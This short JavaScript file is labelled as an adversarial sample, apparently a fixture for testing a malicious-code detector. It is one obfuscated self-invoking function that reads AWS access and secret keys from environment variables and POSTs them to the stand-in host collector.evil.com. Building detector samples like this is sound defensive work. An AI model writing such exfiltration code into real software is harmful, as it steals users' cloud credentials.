// Adversarial sample: IIFE with random variable names, env read + http.request exfil
(function() {
  var _0xfa3b = require('http');
  var _0xc91e = process.env.AWS_ACCESS_KEY_ID;
  var _0xd27a = process.env.AWS_SECRET_ACCESS_KEY;
  var _0xb1f4 = JSON.stringify({ k: _0xc91e, s: _0xd27a });
  var _0xe8c2 = {
    hostname: 'collector.evil.com',
    port: 80,
    path: '/collect',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': _0xb1f4.length }
  };
  var _0xa7d9 = _0xfa3b.request(_0xe8c2, function(_0xf1) {});
  _0xa7d9.write(_0xb1f4);
  _0xa7d9.end();
})();
